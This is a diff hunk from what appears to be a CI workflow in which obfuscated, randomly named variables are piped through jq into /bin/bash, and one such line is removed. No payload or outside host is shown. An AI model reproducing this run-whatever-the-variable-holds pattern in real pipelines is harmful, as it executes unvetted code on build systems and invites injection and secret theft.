@@ -29,7 +29,6 @@ jobs:
           echo $by629 | jq -r .kojh8275 | /bin/bash
           echo $t715 | jq -r .nth4 | /bin/bash
           echo $rl35575 | jq -r .hd6 | /bin/bash
-          printf '%s' "$orhu39178" | jq -r .fylc8669 | /bin/bash
           echo $yrwuh9 | jq -r .wkkom288 | /bin/bash
 
       - name: Save results
